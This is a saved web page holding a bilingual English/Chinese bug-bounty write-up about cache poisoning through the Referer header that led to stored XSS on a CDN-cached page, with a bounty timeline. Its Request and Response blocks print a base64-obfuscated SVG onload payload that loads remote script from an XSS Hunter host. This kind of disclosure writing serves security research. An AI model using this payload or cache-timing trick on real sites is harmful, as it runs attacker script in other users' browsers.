<DIV class="gs gr hl hm hn" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV class="ab ce" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<H1 id=f4d6 class="pw-post-title ho hp hq bf hr hs ht hu hv hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1" data-testid="storyTitle">How I Made $16,500 Hacking CDN Caching Servers &#8212; Part 1 
<P><SPAN class=headers>Title:</SPAN></B><SPAN class=RefText> &#25105;&#22914;&#20309;&#36890;&#36807;&#40657;&#20837;CDN&#32531;&#23384;&#26381;&#21153;&#22120;&#36186;&#21462;$16,500 &#8212; &#31532;1&#37096;&#20998;</SPAN></P>
<P><SPAN class=RefText><SPAN class=headers><SPAN class=headers>Author:</SPAN></B><SPAN class=RefText> bxmbn</SPAN></FONT></SPAN></FONT></SPAN></P>
<P><SPAN class=RefText><A href="https://infosecwriteups.com/how-i-made-15-000-by-hacking-caching-servers-part-1-5541712a61c3"><SPAN class=headers>Link:</SPAN></B><SPAN class=RefText> https://infosecwriteups.com/how-i-made-15-000-by-hacking-caching-servers-part-1-5541712a61c3</SPAN></FONT></A></SPAN></P>
<P><SPAN class=RefText></SPAN></FONT></P></H1></DIV>
<DIV data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<H2 id=8c55 class="pw-subtitle-paragraph in hp hq bf b io ip iq ir is it iu iv iw ix iy iz ja jb jc ct ea" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph=""><SPAN class=headers>Source:</SPAN></B><SPAN class=RefText> infosec writeups</SPAN></FONT></H2>
<H2 class="pw-subtitle-paragraph in hp hq bf b io ip iq ir is it iu iv iw ix iy iz ja jb jc ct ea" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="">@bxmbn</H2></DIV></DIV>
<DIV class="ab ce" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">&nbsp;</DIV>
<DIV class="ab ce" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV class="cl bh gy gz ha hb" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5"><FIGURE class="nx ny nz oa ob oc nu nv paragraph-image" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV class="nu nv nw" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5"><PICTURE data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5"><img role=presentation class="bh es od c" alt="" src="https://miro.medium.com/v2/resize:fit:610/1*pyZEcnS5fLESc8yUS4wbdA.png" width=610 height=372 data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-cubox-image-load="false" data-cubox-image-index="4" data-cubox-image-id="70f3e5fa315f82ff4d4902eb8f7488a5" loading="eager"></PICTURE></DIV></FIGURE></DIV></DIV></DIV>
<DIV class="gs gr hl hm hn" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV class="ab ce" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV class="cl bh gy gz ha hb" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<H1 id=5302 class="ol om hq bf on oo op iq fi oq or it fl os ot ou ov ow ox oy oz pa pb pc pd pe bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph=""><MARK class="abg abh ap" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5"><EM class=pf data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-immersive-translate-paragraph="1">Cache Poisoning To Stored XSS 
<P>&#32531;&#23384;&#20013;&#27602;&#21040;&#23384;&#20648;&#22411; XSS</EM></MARK></H1>
<BLOCKQUOTE class="pg ph pi" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<P id=f888 class="pj pk pl pm b io pn po pp ir pq pr ps fm pt pu pv fp pw px py fs pz qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph=""><EM class=hq data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-immersive-translate-paragraph="1">Bounty: $6,300&nbsp;&nbsp;&#22870;&#21169;&#65306;$6,300</EM></P></BLOCKQUOTE>
<P id=6a00 class="pw-post-body-paragraph pj pk hq pm b io pn po pp ir pq pr ps fm pt pu pv fp pw px py fs pz qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">This was actually my first Cache Poisoning, I initially reported it as a cache Deception issue, because that is all i knew about caching exploits at that time, and the reason how and why this ended up being triaged and awarded as a Cache Poisoning to Stored XSS, was because the Triager, opened my eyes and told me to look for a Self-XSS, so it can be triaged as High or Critical. 
<P>&#36825;&#23454;&#38469;&#19978;&#26159;&#25105;&#30340;&#31532;&#19968;&#27425;&#32531;&#23384;&#20013;&#27602;&#65292;&#25105;&#26368;&#21021;&#25226;&#23427;&#25253;&#21578;&#20026;&#32531;&#23384;&#27450;&#39575;&#38382;&#39064;&#65292;&#22240;&#20026;&#37027;&#26102;&#25105;&#23545;&#32531;&#23384;&#28431;&#27934;&#20102;&#35299;&#30340;&#21482;&#26377;&#36825;&#20123;&#65292;&#32780;&#26368;&#32456;&#34987;&#20998;&#31867;&#20026;&#32531;&#23384;&#20013;&#27602;&#21644;&#23384;&#20648;&#22411; XSS &#30340;&#21407;&#22240;&#26159;&#65292;&#20998;&#31867;&#20154;&#21592;&#35753;&#25105;&#24320;&#20102;&#30524;&#30028;&#65292;&#21578;&#35785;&#25105;&#21435;&#23547;&#25214;&#33258;&#25105; XSS&#65292;&#36825;&#26679;&#23601;&#21487;&#20197;&#34987;&#20998;&#31867;&#20026;&#39640;&#21361;&#25110;&#20005;&#37325;&#12290;</P>
<P id=0824 class="pw-post-body-paragraph pj pk hq pm b io pn po pp ir pq pr ps fm pt pu pv fp pw px py fs pz qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">I was able to inject Javascript via the Referer Header, but an attacker still needed to send the Poisoned URL to the victim, as the URL needed to be modified by the attacker, so the Cache Server could save it. 
<P>&#25105;&#33021;&#22815;&#36890;&#36807; Referer Header &#27880;&#20837; Javascript&#65292;&#20294;&#25915;&#20987;&#32773;&#20173;&#28982;&#38656;&#35201;&#23558;&#27602;&#21270;&#30340; URL &#21457;&#36865;&#32473;&#21463;&#23475;&#32773;&#65292;&#22240;&#20026; URL &#38656;&#35201;&#30001;&#25915;&#20987;&#32773;&#20462;&#25913;&#65292;&#20197;&#20415;&#32531;&#23384;&#26381;&#21153;&#22120;&#33021;&#20445;&#23384;&#23427;&#12290;</P>
<P id=6b32 class="pw-post-body-paragraph pj pk hq pm b io pn po pp ir pq pr ps fm pt pu pv fp pw px py fs pz qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">After some Google Dorking, I was able to find an URL that was being cached directly without any extensions. This is all i needed :D 
<P>&#32463;&#36807;&#19968;&#20123;&#35895;&#27468;&#25628;&#32034;&#65292;&#25105;&#25214;&#21040;&#20102;&#19968;&#20010;&#27809;&#26377;&#20219;&#20309;&#25193;&#23637;&#21517;&#30452;&#25509;&#34987;&#32531;&#23384;&#30340; URL&#12290;&#36825;&#23601;&#26159;&#25105;&#25152;&#38656;&#35201;&#30340; :D</P>
<P id=c6d2 class="pw-post-body-paragraph pj pk hq pm b io pn po pp ir pq pr ps fm pt pu pv fp pw px py fs pz qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">I quickly updated the report. 
<P>&#25105;&#24555;&#36895;&#26356;&#26032;&#20102;&#25253;&#21578;&#12290;</P>
<P id=478c class="pw-post-body-paragraph pj pk hq pm b io pn po pp ir pq pr ps fm pt pu pv fp pw px py fs pz qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">I provided even more impact by saving my XSSHunter Payload without any &#8220;cache busters&#8221; (?param=123) then, timed the Cache Server until it refreshes and sent the Request. 
<P>&#25105;&#36890;&#36807;&#20445;&#23384;&#25105;&#30340; XSSHunter Payload &#32780;&#27809;&#26377;&#20219;&#20309;&#8220;&#32531;&#23384;&#30772;&#22351;&#32773;&#8221;&#65288;?param=123&#65289;&#65292;&#28982;&#21518;&#35745;&#26102;&#32531;&#23384;&#26381;&#21153;&#22120;&#30452;&#21040;&#23427;&#21047;&#26032;&#24182;&#21457;&#36865;&#35831;&#27714;&#65292;&#20174;&#32780;&#25552;&#20379;&#20102;&#26356;&#22823;&#30340;&#24433;&#21709;&#12290;</P>
<H2 id=2e9f class="qd om hq bf on fg qe fh fi fj qf fk fl fm qg fn fo fp qh fq fr fs qi ft fu qj bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Request:&nbsp;&nbsp;&#35831;&#27714;&#65306;</H2><PRE class="nx ny nz oa ob qk ql qm qn ay qo bk"><SPAN id=4ec8 class="qd om hq ql b fx qp qq l ka qr" data-selectable-paragraph="">GET /xxxx/xxxx/xxx HTTP/2<P>Host: Redacted<P>Referer: ?&lt;/script&gt;&lt;svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=&gt;<P>...</SPAN></P></PRE>
<H2 id=7291 class="qd om hq bf on fg qe fh fi fj qf fk fl fm qg fn fo fp qh fq fr fs qi ft fu qj bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Response:&nbsp;&nbsp;&#21709;&#24212;&#65306;</H2><PRE class="nx ny nz oa ob qk ql qm qn ay qo bk"><SPAN id=e296 class="qd om hq ql b fx qp qq l ka qr" data-selectable-paragraph="">HTTP/2 200 Ok</SPAN><SPAN id=7f6f class="qd om hq ql b fx qs qq l ka qr" data-selectable-paragraph="">...<P>Content-Type: text/html; charset=utf-8<P>X-Cache: HIT<P>...</SPAN><SPAN id=a065 class="qd om hq ql b fx qs qq l ka qr" data-selectable-paragraph="">&lt;html&gt;</SPAN><SPAN id=6e5d class="qd om hq ql b fx qs qq l ka qr" data-selectable-paragraph="">...</SPAN><SPAN id=2112 class="qd om hq ql b fx qs qq l ka qr" data-selectable-paragraph="">&lt;script&gt;</SPAN><SPAN id=5ce1 class="qd om hq ql b fx qs qq l ka qr" data-selectable-paragraph="">...</SPAN><SPAN id=b656 class="qd om hq ql b fx qs qq l ka qr" data-selectable-paragraph="">"Referer":"?&lt;/script&gt;<P>&lt;svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=&gt;</SPAN><SPAN id=c074 class="qd om hq ql b fx qs qq l ka qr" data-selectable-paragraph="">...</SPAN></P></PRE>
<P id=eb9d class="pw-post-body-paragraph pj pk hq pm b io pn po pp ir pq pr ps fm pt pu pv fp pw px py fs pz qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">I woke up with 35 Notifications from XSSHunter the next day, and to my surprise, 4 of them were fired on a different subdomain. 
<P>&#31532;&#20108;&#22825;&#25105;&#37266;&#26469;&#26102;&#25910;&#21040;&#20102;&#26469;&#33258; XSSHunter &#30340; 35 &#26465;&#36890;&#30693;&#65292;&#20196;&#25105;&#24778;&#35766;&#30340;&#26159;&#65292;&#20854;&#20013; 4 &#26465;&#26159;&#22312;&#19981;&#21516;&#30340;&#23376;&#22495;&#19978;&#35302;&#21457;&#30340;&#12290;</P><FIGURE class="nx ny nz oa ob oc nu nv paragraph-image" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV role=button tabIndex=0 class="qu qv cd qw bh qx" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV class="nu nv qt" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5"><PICTURE data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5"><SOURCE data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" type="image/webp" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*G7CSoZwfASUF08fXxC0vhA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*G7CSoZwfASUF08fXxC0vhA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*G7CSoZwfASUF08fXxC0vhA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*G7CSoZwfASUF08fXxC0vhA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*G7CSoZwfASUF08fXxC0vhA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*G7CSoZwfASUF08fXxC0vhA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G7CSoZwfASUF08fXxC0vhA.png 1400w"><SOURCE data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-testid="og" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" srcset="https://miro.medium.com/v2/resize:fit:640/1*G7CSoZwfASUF08fXxC0vhA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*G7CSoZwfASUF08fXxC0vhA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*G7CSoZwfASUF08fXxC0vhA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*G7CSoZwfASUF08fXxC0vhA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*G7CSoZwfASUF08fXxC0vhA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*G7CSoZwfASUF08fXxC0vhA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*G7CSoZwfASUF08fXxC0vhA.png 1400w"><img role=presentation class="bh es od c" alt="" src="https://miro.medium.com/v2/resize:fit:700/1*G7CSoZwfASUF08fXxC0vhA.png" width=700 height=487 data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-cubox-image-load="false" data-cubox-image-index="5" data-cubox-image-id="49dbe273bbe1217029a53e88c95dd772" loading="lazy"></PICTURE></DIV></DIV></FIGURE></DIV></DIV></DIV>
<DIV class="gs gr hl hm hn" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV class="ab ce" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV class="cl bh gy gz ha hb" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<H1 id=b1cd class="ol om hq bf on oo op iq fi oq or it fl os ot ou ov ow ox oy oz pa pb pc pd pe bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph=""><STRONG class=am data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5"><EM class=pf data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-immersive-translate-paragraph="1">Timeline:&nbsp;&nbsp;&#26102;&#38388;&#32447;&#65306;</EM></STRONG></H1>
<BLOCKQUOTE class="pg ph pi" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<P id=2701 class="pj pk pl pm b io pn po pp ir pq pr ps fm pt pu pv fp pw px py fs pz qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Reported &#8594; November 7, 2021 
<P>&#25253;&#21578;&#26085;&#26399; &#8594; 2021 &#24180; 11 &#26376; 7 &#26085;</P>
<P id=7870 class="pj pk pl pm b io pn po pp ir pq pr ps fm pt pu pv fp pw px py fs pz qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Triaged &#8594; November 11, 2021 
<P>&#20998;&#31867; &#8594; 2021 &#24180; 11 &#26376; 11 &#26085;</P>
<P id=a693 class="pj pk pl pm b io pn po pp ir pq pr ps fm pt pu pv fp pw px py fs pz qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Bounty Awarded &#8594; November 17, 2021 
<P>&#22870;&#37329;&#21457;&#25918; &#8594; 2021 &#24180; 11 &#26376; 17 &#26085;</P></BLOCKQUOTE></DIV></DIV></DIV>
<DIV class="gs gr hl hm hn" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV class="ab ce" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<DIV class="cl bh gy gz ha hb" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5">
<H1 id=e65b class="ol om hq bf on oo op iq fi oq or it fl os ot ou ov ow ox oy oz pa pb pc pd pe bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Next:&nbsp;&nbsp;&#19979;&#19968;&#20010;&#65306;</H1>
<P id=6acb class="pw-post-body-paragraph pj pk hq pm b io qy po pp ir qz pr ps fm ra pu pv fp rb px py fs rc qa qb qc gs bk" data-immersive-translate-walked="d34f1ee8-c914-40c7-84e0-f411ee13ebb5" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Part 2: A Nice Way To Hide XSS 
<P>&#31532;&#20108;&#37096;&#20998;&#65306;&#38544;&#34255; XSS &#30340;&#19968;&#31181;&#22909;&#26041;&#27861;